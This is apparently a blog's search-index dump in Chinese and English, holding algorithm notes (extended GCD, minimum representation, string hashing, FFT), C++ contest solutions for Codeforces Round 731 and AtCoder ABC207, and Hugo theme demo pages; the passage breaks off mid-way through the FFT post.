$$ 得 $$ \\begin{aligned} ax_{1}+by_{1}\u0026amp;=bx_{2}+(a - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times b)y_{2}\\\\ ax_{1}+by_{1}\u0026amp;=ay_{2}+b(x_{2} - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times y_{2}) \\end{aligned} $$ 得 $$ \\begin{aligned} x_{1} \u0026amp;= y_{2}\\\\ y_{1} \u0026amp;= x_{2} - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times y_{2} \\end{aligned} $$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int exgcd(int a, int b, int \u0026amp;x, int \u0026amp;y) { if(!b) { x = 1, y = 0; return a; } int g = exgcd(b, a % b, y, x); y -= a / b * x; return g; } int exgcd(int a, int b, int \u0026amp;x, int \u0026amp;y) { int x1 = 1, x2 = 0, x3 = 0, x4 = 1; while (b != 0) { int c = a / b; tie(x1, x2, x3, x4, a, b) = make_tuple(x3, x4, x1 - x3 * c, x2 - x4 * c, b, a - b * c); } x = x1, y = x2; return a; } ","date":"2021-07-20T00:00:00Z","permalink":"https://example.com/p/gcd-exgcd/","title":"GCD \u0026 EXGCD"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating. — Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 6 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] image = \u0026#34;pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg\u0026#34; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-07-19T09:55:02+08:00","image":"https://example.com/p/hello-hugo/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/hello-hugo/","title":"Hello Hugo"},{"content":"最小表示法 概念 循环同构串：我们有字符串 bcad ，那么它的循环同构串可以是 bcad,cadb,adbc,dbca。\n最小表示法可以用来找出字符串 S （或者数组）的循环同构串中字典序最小的一个。\n实现方法 复杂度 $O(N)$。\n假设有一个字符串 $S$ ,设 $S$ 的长度为 $n=|S|$，思考如下：\n两个指针 $i$ 、$j$ ，初始化时 $i$ 指向 $s_{0}$，j 指向 $s_{1}$ 。我们规定 $i$ 和 $j$ 在任意时刻都不能相等。\n匹配长度 $k = 0$ 开始，检验 $s_{i + k}$ 和 $s_{j + k}$ 是否相等，相等则 $k \\gets k+1$，一直循环下去，直到找到第一个不相同的字符。（若 $k = n$ 则全字符串相等）\n在遇到第一个不相同字符的过程中，我们发现 $s_{i + k}$ 和 $s_{j + k}$ 的关系有两种：\n$s_{i + k} \u0026gt; s_{j + k}$ ，显然 此时以 $i$ 为开头必然不使字典序最小，所以 $i \\gets i+k+1$。 $s_{i + k} \u0026lt; s_{j + k}$ ，同理，$j \\gets j+k+1$。 当 $i,j,k$ 中有一个等于 $n$，循环结束，返回 $\\min(i，j)$。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int n, S[300009]; int Min_show() { int i = 0, j = 1, k = 0; while (i \u0026lt; n \u0026amp;\u0026amp; j \u0026lt; n \u0026amp;\u0026amp; k \u0026lt; n) { if (S[(i + k) % n] == S[(j + k) % n]) k ++; else { if (S[(i + k) % n] \u0026gt; S[(j + k) % n]) i += k + 1; else j += k + 1; if (i == j) i++; k = 0; } } return min(i, j); //返回最小表示 } 习题 P1368 最小表示法\n","date":"2021-07-18T00:00:00Z","permalink":"https://example.com/p/%E6%9C%80%E5%B0%8F%E8%A1%A8%E7%A4%BA%E6%B3%95/","title":"最小表示法"},{"content":"字符串 Hash 字符串 Hash 的思想 Hash 的核心思想在于，将输入映射到一个值域较小、可以方便比较的范围。而在字符串中主要是为了方便比较，而且为了减少 Hash 冲突，一般映射的范围较大。\n我们定义一个把 字符串映射到整数 的函数 $f$ ，这个 $f$ 称为是 Hash 函数。我们希望这个函数可以方便地帮我们判断两个字符串是否相等， 有两点很重要。\n在 Hash 函数值不一样的时候，两个字符串一定不一样； 在 Hash 函数值一样的时候，两个字符串不一定一样（但有大概率一样，且我们当然希望它们总是一样的）。 Hash 函数值一样时字符串却不一样, 我们称为 哈希冲突。\n如何 Hash 一般采用多项式的方法，对于一个长度为 $\\large{l}$ 的字符串 $s $ ，我们可以定义\n$$ f(s) = \\sum_{i = 1}^{l} s[i] \\times b^{i - 1}\\pmod m $$\n例如：对于字符串 $xyz$ ，其多项式为 $xb^{2} + yb^{1} + zb^{0}$ ，所以对字符串 Hash 的另一种理解就是将字符串转化为 $b$ 进制数。\n有以下几点值得注意：\n如果要从 $1$ 开始存储字符串，我们可以使用 scanf(\u0026quot;%s\u0026quot;, s + 1) 来读取输入。 对于 $b$ 的取值，我们一般取 $131$ 或者 $13331$（经验值，字符串哈希冲突较少） 对于模数 $M$，我们可以取一个大指数，如 1e9 + 7,998244353,212370440130137957ll 或者使用 unsigned long long 自动对 $2 ^{64}$ 取模。 对于减少哈希冲突，我们还可以通过双 Hash ，也就是分别用两个不同的 $base$ 和 $M$ 来计算。 Hash 复杂度为 $O(N)$，查询某段子串的 Hash 复杂度为 $O(1)$ 。\n子串查询原理： $$ \\begin{aligned} hash[1] \u0026amp;= s[1] b^{0} \\\\\\\\ hash[2] \u0026amp;= s[1] b^{1} + s[2]^{0}\\\\\\\\ hash[3] \u0026amp;= s[1] b^{2} + s[2]^{1} + s[3]^{0}\\\\\\\\ hash[4] \u0026amp;= s[1] b^{3} + s[2]^{3} + s[3]^{1} + s[4]^{0}\\\\\\\\ hash[5] \u0026amp;= s[1] b^{4} + s[2]^{3} + s[3]^{2} + s[4]^{1} + s[5]^{0} \\end{aligned} $$\n假如我们要查询子串 $[3,5]$ ，我们会发现 $hash[5]$ 与 $hash[2]$，如果不看 b 的幂次，正好是答案，所以我们将 $hash[2]$ 的幂次每一位补齐到与 $hash[5]$ 一样。 $$ \\begin{aligned} hash[2] \\times b^{3} \u0026amp;= s[1]b^{4} + s[2]b^{3}\\\\ hash[5] \u0026amp;= s[1] b^{4} + s[2]^{3} + s[3]^{2} + s[4]^{1} + s[5]^{0} \\end{aligned} $$ 此时将两者相减所得的值正好是 子串的 hash 值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 typedef unsigned long long ull; const ull base = 131, M = 1e5 + 7, mod = 1e9 + 7; char s[M]; ull myhash[M], power[M]; //myhash 里面存算到某位时的 Hash 值，power 存 base 的幂次（子串查询才需要） ull get_hash(char *s) { ull value = 0; power[0] = 1; for (int i = 1; s[i]; i++) { value = (value * base + s[i]) % mod; myhash[i] = value; power[i] = power[i - 1] * base % mod; } return value;//返回最终字符串的 Hash 值 } //计算某段的 Hash 值 ull get_sub_hash(int l, int r) { return (myhash[r] - (myhash[l - 1] * power[r - l + 1]) % mod + mod) % mod; } ","date":"2021-07-16T00:00:00Z","permalink":"https://example.com/p/%E5%AD%97%E7%AC%A6%E4%B8%B2hash/","title":"字符串Hash"},{"content":"Codeforces Round #731 (Div. 3) A. Shortest Path with Obstacle 判断一下两点最短路径是否为一条直线，障碍是否在该直线上。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { int t; cin \u0026gt;\u0026gt; t; while(t --){ int x1, y1, x2, y2, xf, yf; cin \u0026gt;\u0026gt; x1 \u0026gt;\u0026gt; y1 \u0026gt;\u0026gt; x2 \u0026gt;\u0026gt; y2 \u0026gt;\u0026gt; xf \u0026gt;\u0026gt; yf; if(x1 == x2 \u0026amp;\u0026amp; x1 == xf \u0026amp;\u0026amp; ((yf \u0026gt;= y1 \u0026amp;\u0026amp; yf \u0026lt;= y2) || (yf \u0026lt;= y1 \u0026amp;\u0026amp; yf \u0026gt;= y2))) cout \u0026lt;\u0026lt; abs(y1 - y2) + 2 \u0026lt;\u0026lt; endl; else if(y1 == y2 \u0026amp;\u0026amp; y1 == yf \u0026amp;\u0026amp; ((xf \u0026gt;= x1 \u0026amp;\u0026amp; xf \u0026lt;= x2) || (xf \u0026lt;= x1 \u0026amp;\u0026amp; xf \u0026gt;= x2))) cout \u0026lt;\u0026lt; abs(x1 - x2) + 2 \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; abs(x1 - x2) + abs(y1 - y2) \u0026lt;\u0026lt; endl; } return 0; } B. Alphabetical Strings 先找到 a 的位置，然后双指针向两边寻找，如果找不到符合的则输出 NO；\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { int t; cin \u0026gt;\u0026gt; t; while (t--) { string s; cin \u0026gt;\u0026gt; s; int st = -1; for (int i = 0; i \u0026lt; s.size(); i++) if (s[i] == \u0026#39;a\u0026#39;) st = i; if (st == -1) { cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; continue; } bool flag = true; char now = \u0026#39;b\u0026#39;; for (int l = st - 1, r = st + 1; l \u0026gt;= 0 || r \u0026lt; s.size(); now++) { if (l \u0026gt;= 0 \u0026amp;\u0026amp; s[l] == now) l--; else if (r \u0026lt; s.size() \u0026amp;\u0026amp; s[r] == now) r++; else flag = false; } if (flag) cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; } return 0; } C. Pair Programming 每次添加 a，b数组中可以添加的操作，循环，直到添加完或者出现无法继续添加的情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \u0026lt;bits/stdc++.h\u0026gt; #define INF 0x3f3f3f3f using namespace std; const int M = 1e5 + 7; int a[M], b[M], ans[M]; int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { int k, n, m; scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;k, \u0026amp;n, \u0026amp;m); for (int i = 1; i \u0026lt;= n; i ++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i]); for (int i = 1; i \u0026lt;= m; i ++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;b[i]); a[n + 1] = b[m + 1] = INF; //数组末尾后一个为INF，方便后面判断 int cnt = 1; for (int i = 1, j = 1; i \u0026lt;= n || j \u0026lt;= m;) { while (i \u0026lt;= n \u0026amp;\u0026amp; a[i] \u0026lt;= k) { ans[cnt ++] = a[i]; if (a[i] == 0) k++; i ++; } while (j \u0026lt;= m \u0026amp;\u0026amp; b[j] \u0026lt;= k) { ans[cnt++] = b[j]; if (b[j] == 0) k++; j ++; } if (a[i] \u0026lt;= k || b[j] \u0026lt;= k) continue; else break; } if (cnt != n + m + 1) printf(\u0026#34;-1\\n\u0026#34;); else { for (int i = 1; i \u0026lt;= n + m; i ++) printf(\u0026#34;%d \u0026#34;, ans[i]); printf(\u0026#34;\\n\u0026#34;); } } return 0; } D. Co-growing Sequence 寻找两数组直接的关系\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int M = 2e5 + 7; int num[M], ans[M]; int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;num[i]); int last = num[1]; for (int i = 2; i \u0026lt;= n; i++) { ans[i] = (last | num[i]) ^ num[i]; last = ans[i] ^ num[i]; } for (int i = 1; i \u0026lt;= n; i++) printf(\u0026#34;%d \u0026#34;, ans[i]); printf(\u0026#34;\\n\u0026#34;); } return 0; } E. Air Conditioners 优先队列BFS，$O(N)$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 #include \u0026lt;bits/stdc++.h\u0026gt; #define x first #define y second using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int M = 3e5 + 7; int a[M], temp[M], ans[M], n, k; bool st[M]; void bfs() { priority_queue\u0026lt;PII, vector\u0026lt;PII\u0026gt;, greater\u0026lt;PII\u0026gt;\u0026gt; heap; for (int i = 1; i \u0026lt;= k; i++) heap.push({temp[i], a[i]}); while (heap.size()) { auto now = heap.top(); heap.pop(); if (st[now.y]) continue; st[now.y] = true; ans[now.y] = now.x; if (now.y \u0026gt; 1) heap.push({now.x + 1, now.y - 1}); if (now.y \u0026lt; n) heap.push({now.x + 1, now.y + 1}); } } int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { memset(st, 0, sizeof st); scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;k); for (int i = 1; i \u0026lt;= k; i++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i]); for (int i = 1; i \u0026lt;= k; i++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;temp[i]); bfs(); for (int i = 1; i \u0026lt;= n; i++) printf(\u0026#34;%d \u0026#34;, ans[i]); printf(\u0026#34;\\n\u0026#34;); } return 0; } F. Array Stabilization (GCD version) 首先寻找整个数组的是否完全相等，算出整个数组的 gcd，每个元素 /= gcd，找到该数组的最长公共质因子就为答案。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int M = 1e6 + 7; int prime[M], cnt, num[M]; bool st[M]; int gcd(int a, int b) { return b ? gcd(b, a % b) : a; } void get_prime(int x) { for (int i = 2; i \u0026lt;= x; i++) { if (!st[i]) prime[cnt++] = i; for (int j = 0; prime[j] \u0026lt;= x / i; j++) { st[prime[j] * i] = true; if (i % prime[j] == 0) break; } } } bool cmp(PII a, PII b) { if (a.first != b.first) return a.first \u0026gt; b.first; else return a.second \u0026lt; b.second; } int main() { get_prime(1e6);//筛一下质数 int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { map\u0026lt;int, int\u0026gt; mp; vector\u0026lt;PII\u0026gt; vec; int n, m = 0, g = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); bool same = true; for (int i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;num[i]); if (same \u0026amp;\u0026amp; i \u0026gt; 1 \u0026amp;\u0026amp; num[i] != num[i - 1]) same = false; if (!g) g = num[i]; else g = gcd(g, num[i]); m = max(m, num[i]); int now = num[i];//对每一个数进行质因数分解 for (int j = 0; j \u0026lt;= 1e3 \u0026amp;\u0026amp; prime[j] \u0026lt;= now; j++) { if (now % prime[j] == 0) { mp[prime[j]]++; while (now % prime[j] == 0) { now /= prime[j]; } } } if (now != 1) mp[now]++; } if (same) { printf(\u0026#34;0\\n\u0026#34;); continue; } for (auto it : mp) { vec.push_back({it.second, it.first}); } sort(vec.begin(), vec.end(), cmp);//按出现次数对质因数排序 for (int i = 1; i \u0026lt;= n; i++) num[i] /= g; int ans = 1, count_num = 0; for (auto it : vec) { if (count_num++ \u0026gt; 1e3 || it.first \u0026lt;= ans) break; int k = 0, now = 0, head = 0; for (int j = 1; j \u0026lt;= n; j++) { if (num[j] % it.second == 0) k++; else { if (num[1] % it.second == 0 \u0026amp;\u0026amp; !head) head = k; now = max(now, k); k = 0; } } if (k) { now = max(now, k + head); } ans = max(ans, now); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } return 0; } ","date":"2021-07-12T00:00:00Z","permalink":"https://example.com/p/cf731/","title":"CF731"},{"content":"AtCoder Beginner Contest 207 A-Repression 水题\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { int a, b, c; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c; int ans = max(a + b, b + c); ans = max(a + c, ans); cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; return 0; } B-Hydrate 水题，当$ b \\ge C \\times D$时无解； 否则设答案为T $$ D \\geqslant \\frac{A + T \\times B}{C \\times T} \\Rightarrow T \\geqslant \\frac{A}{D \\times C - B} $$ 则输出 $\\left \\lceil \\frac{A}{D \\times C - B} \\right \\rceil $\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;cmath\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; int main() { int a, b, c, d; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c \u0026gt;\u0026gt; d; if (b \u0026gt;= c * d) puts(\u0026#34;-1\u0026#34;); else printf(\u0026#34;%lld\\n\u0026#34;, (ll)ceil(a / (d * c - b))); return 0; } C-Many Segments 暴力法, 每两段区间直接进行判断 $O(N ^ {2}) $; 对 4 种区间情况，进行了一点小处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; #define x first #define y second using namespace std; typedef long long ll; const int M = 2021; typedef pair\u0026lt;int, int\u0026gt; PII; PII num[M]; int t[M]; void f(int op, double \u0026amp;a, double \u0026amp;b) { //处理区间开闭 if (op == 2) b -= 0.1; else if (op == 3) a += 0.1; else if (op == 4) { a += 0.1, b -= 0.1; } } bool cheak(int i, int j) { //判断函数 double a = num[i].x, b = num[i].y, c = num[j].x, d = num[j].y; f(t[i], a, b); f(t[j], c, d); if (a \u0026lt;= c \u0026amp;\u0026amp; b \u0026gt;= c) return true; else if (c \u0026lt;= a \u0026amp;\u0026amp; d \u0026gt;= a) return true; return false; } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;t[i], \u0026amp;num[i].x, \u0026amp;num[i].y); int cnt = 0; for (int i = 1; i \u0026lt;= n; i++) { for (int j = i + 1; j \u0026lt;= n; j++) { if (cheak(i, j)) { cnt++; } } } printf(\u0026#34;%d\\n\u0026#34;, cnt); return 0; } 还可以用离散化 + 扫描线法 ${\\large O}(N \\log{N}) $; 预处理区间边界，用 map 实现离散化，再扫描线求出答案；\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; #define x first #define y second using namespace std; typedef long long ll; const int M = 2021; typedef pair\u0026lt;ll, ll\u0026gt; Pll; typedef pair\u0026lt;int, int\u0026gt; PII; Pll num[M]; int t[M]; void f(int op, ll \u0026amp;a, ll \u0026amp;b) { //处理区间边界 a *= 10, b *= 10; if (op == 2) b -= 1; else if (op == 3) a += 1; else if (op == 4) { a += 1; b -= 1; } } int main() { int n, cnt = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); map\u0026lt;ll, PII\u0026gt; mp; for (int i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d%lld%lld\u0026#34;, \u0026amp;t[i], \u0026amp;num[i].x, \u0026amp;num[i].y); f(t[i], num[i].x, num[i].y); mp[num[i].x].x++, mp[num[i].y].y++; //记录线段的始，末 } int last = 0; // 当前“延续”的线段 for (auto i : mp) { cnt += last * i.y.x; //计算新出现的与旧的线段的交叉 cnt += (i.y.x - 1) * (i.y.x) / 2;//计算新线段之间的交叉 last += i.y.x - i.y.y; } printf(\u0026#34;%d\\n\u0026#34;, cnt); return 0; } 思考：如果是三条线段重叠，则每次更新可能是 $$ \\binom{last}{1} \\binom{new}{2} + \\binom{last}{2}\\binom{new}{1} + \\binom{new}{3} $$ 依此类推……\nE - Mod i 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; const ll MOD = 1e9 + 7, M = 3030; ll num[M], S[M], dp[M][M], r[M]; int main(){ int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= N; i++) scanf(\u0026#34;%lld\u0026#34;, \u0026amp;num[i]); for (int i = 1; i \u0026lt;= N; i++){ S[i] = S[i - 1] + num[i]; } ll ans = 0; dp[0][0] = 1; for (int i = 1; i \u0026lt;= N; i++){ memset(r, 0, sizeof r); for (int j = 0; j \u0026lt;= N; j++){ dp[i][j] = r[S[j] % i]; r[S[j] % i] += dp[i - 1][j]; r[S[j] % i] %= MOD; } ans += dp[i][N]; ans %= MOD; } printf(\u0026#34;%lld\\n\u0026#34;, ans); return 0; } ","date":"2021-07-02T00:00:00Z","permalink":"https://example.com/p/abc207/","title":"ABC207"},{"content":"图片 公式 Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\nMathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n视频链接测试 Hugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nYouTube Privacy Enhanced Shortcode bilibilibi Shortcode FFT 以下讲述的算法是 Cooley–Tukey FFT，它在算法竞赛中使用的更为广泛。\n前置知识：复数，需要理解 Euler 公式。\n多项式乘法 对于 $n$ 次多项式\n$$ \\begin{aligned} f(x) = \\sum_{i=0}^n f_ix^i \u0026amp;= f_0 + f_1 x + f_2x^2 + \\cdots + g_nx^n \\\\ g(x) = \\sum_{i=0}^n g_ix^i \u0026amp;= g_0 + g_1 x + g_2x^2 + \\cdots + g_nx^n \\end{aligned} $$\n它们的卷积是 $F(x) = f(x) \\ast g(x) = (f \\ast g)(x) = \\sum\\limits_{k=0}^{2n} c_kx^k$，其中\n$$ c_k = \\sum_{i+j=k}f_ig_j $$\n因此朴素的计算多项式的卷积需要 $n^2$ 次系数乘法，我们需要优化。\n单位原根 至此，我们计算 DFT 的复杂度仍然是 $O(n^2)$，FFT 所迈出的关键一步是选取特殊的点加速计算。\n单位根中特殊的一个记作 $\\zeta_n = e^{\\frac{2 \\pi i}{n}}$，它叫做单位原根。依 Euler 公式，有\n$$ \\zeta_n = e^{\\tfrac{2 \\pi i}{n}} = \\cos \\left(\\frac{2\\pi}{n}\\right) + i \\sin \\left(\\frac{2\\pi}{n}\\right) $$\n即 $\\zeta_n$ 是单位圆上的一个点，全部的 $n$ 个单位根\n$$ x_k = \\zeta_n^k = e^{k\\tfrac{2 \\pi i}{n}} = \\cos \\left(\\frac{2\\pi k}{n}\\right) + i \\sin \\left(\\frac{2\\pi k}{n}\\right) $$\n恰对应到单位圆的 $n$ 等分点。因此根据 Euler 公式，单位根之间的乘法就是在单位圆上转圈圈。\n不难通过 Euler 公式验证单位原根 $\\zeta_n$ 的几条性质：\n$\\zeta_{2n}^{2k} = \\zeta_n^k$。 $\\zeta_{2n}^{n+k} = -\\zeta_{2n}^k$。 分治 利用单位原根的特殊性，我们可以分治计算 DFT。比如对于 $7$ 次多项式\n$$ \\begin{aligned} f(x) \u0026amp;= f_0 + f_1x + f_2x^2 + f_3 x^3 + f_4 x^4 + f_5 x^5 + f_6 x^6 + f_7 x^7 \\ \u0026amp;= (f_0 + f_2x^2 + f_4x^4 + f_6x^6) + x(f_1 + f_3x^2 + f_5x^4 + f_7x^6) \\end{aligned} $$\n奇偶分类\n$$ \\begin{aligned} f^{[0]}(x) 